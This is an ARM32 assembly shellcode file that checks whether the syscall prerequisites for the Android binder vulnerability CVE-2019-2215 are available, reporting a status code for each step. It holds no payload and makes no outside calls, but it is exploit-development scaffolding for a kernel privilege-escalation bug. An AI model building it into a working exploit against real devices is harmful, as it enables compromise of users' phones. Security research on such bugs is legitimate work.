/*
 * binder_setup_test.s — ARM32 EABI shellcode
 *
 * Tests all CVE-2019-2215 prerequisite syscalls:
 *   1. openat("/dev/binder", O_RDWR)
 *   2. ioctl(binder_fd, BINDER_SET_MAX_THREADS, &0)
 *   3. pipe2(pipefd, 0)
 *   4. epoll_create1(0)
 *   5. epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event)
 *
 * Return value (R0):
 *   0xSSEE where SS = step code, EE = data
 *   0x01EE = step 1 failed, EE = errno
 *   0x02EE = step 2 failed, EE = errno
 *   0x03EE = step 3 failed, EE = errno
 *   0x04EE = step 4 failed, EE = errno
 *   0x05EE = step 5 failed, EE = errno
 *   0xFF00 | binder_fd = ALL PASSED
 *
 * Stack layout (32 bytes):
 *   SP+0:  max_threads (uint32, = 0)
 *   SP+4:  (padding)
 *   SP+8:  pipefd[0] (read end)
 *   SP+12: pipefd[1] (write end)
 *   SP+16: epoll_event.events (uint32)
 *   SP+20: epoll_event.data   (uint64, low word)
 *   SP+24: epoll_event.data   (uint64, high word)
 *   SP+28: (padding)
 *
 * Registers:
 *   R4 = binder_fd
 *   R5 = pipe_rd
 *   R6 = pipe_wr
 *   R7 = syscall number (ARM EABI)
 *   R8 = epoll_fd
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #32

    /* ── Step 1: openat("/dev/binder", O_RDWR) ── */
    mvn     r0, #99             /* AT_FDCWD = -100 */
    adr     r1, binder_path     /* "/dev/binder" */
    mov     r2, #2              /* O_RDWR */
    mov     r3, #0              /* mode = 0 */
    mov     r7, #320
    add     r7, r7, #2          /* __NR_openat = 322 */
    svc     #0
    cmp     r0, #0
    bmi     fail_step1
    mov     r4, r0              /* R4 = binder_fd */

    /* ── Step 2: ioctl(binder_fd, BINDER_SET_MAX_THREADS, &0) ── */
    /*   BINDER_SET_MAX_THREADS = _IOW('b', 5, __u32) = 0x40046205 */
    mov     r0, r4              /* binder_fd */
    ldr     r1, binder_set_max  /* 0x40046205 */
    mov     r3, #0
    str     r3, [sp, #0]        /* max_threads = 0 */
    mov     r2, sp              /* &max_threads */
    mov     r7, #54             /* __NR_ioctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_step2

    /* ── Step 3: pipe2(pipefd, 0) ── */
    add     r0, sp, #8          /* &pipefd[0] */
    mov     r1, #0              /* flags = 0 */
    mov     r7, #352
    add     r7, r7, #7          /* __NR_pipe2 = 359 */
    svc     #0
    cmp     r0, #0
    bmi     fail_step3
    ldr     r5, [sp, #8]        /* R5 = pipe_rd */
    ldr     r6, [sp, #12]       /* R6 = pipe_wr */

    /* ── Step 4: epoll_create1(0) ── */
    mov     r0, #0              /* flags = 0 */
    mov     r7, #352
    add     r7, r7, #5          /* __NR_epoll_create1 = 357 */
    svc     #0
    cmp     r0, #0
    bmi     fail_step4
    mov     r8, r0              /* R8 = epoll_fd */

    /* ── Step 5: epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event) ── */
    /*   struct epoll_event { uint32_t events; epoll_data_t data; } */
    mov     r3, #1              /* EPOLLIN = 0x001 */
    str     r3, [sp, #16]       /* event.events = EPOLLIN */
    str     r4, [sp, #20]       /* event.data.fd = binder_fd */
    mov     r3, #0
    str     r3, [sp, #24]       /* event.data high word = 0 */
    mov     r0, r8              /* epoll_fd */
    mov     r1, #1              /* EPOLL_CTL_ADD */
    mov     r2, r4              /* binder_fd */
    add     r3, sp, #16         /* &event */
    mov     r7, #248
    add     r7, r7, #3          /* __NR_epoll_ctl = 251 */
    svc     #0
    cmp     r0, #0
    bmi     fail_step5

    /* ── All 5 steps passed ── */
    /* Close fds to avoid leaking (best effort) */
    mov     r0, r8              /* close(epoll_fd) */
    mov     r7, #6              /* __NR_close */
    svc     #0
    mov     r0, r5              /* close(pipe_rd) */
    mov     r7, #6
    svc     #0
    mov     r0, r6              /* close(pipe_wr) */
    mov     r7, #6
    svc     #0
    mov     r0, r4              /* close(binder_fd) */
    mov     r7, #6
    svc     #0

    /* Return success: 0xFF00 | binder_fd */
    mov     r0, #0xFF00
    orr     r0, r0, r4
    b       done

fail_step1:
    rsb     r0, r0, #0          /* negate: -(-errno) = errno */
    orr     r0, r0, #0x100      /* step 1 marker */
    b       done

fail_step2:
    rsb     r0, r0, #0
    orr     r0, r0, #0x200
    b       done

fail_step3:
    rsb     r0, r0, #0
    mov     r1, #0x300
    orr     r0, r0, r1
    b       done

fail_step4:
    rsb     r0, r0, #0
    mov     r1, #0x400
    orr     r0, r0, r1
    b       done

fail_step5:
    rsb     r0, r0, #0
    mov     r1, #0x500
    orr     r0, r0, r1
    b       done

done:
    add     sp, sp, #32
    pop     {r4-r11, pc}

    /* ── Data section (embedded in .text for position independence) ── */
    .align 2
binder_set_max:
    .word   0x40046205          /* BINDER_SET_MAX_THREADS */

binder_path:
    .asciz  "/dev/binder"
    .align  2
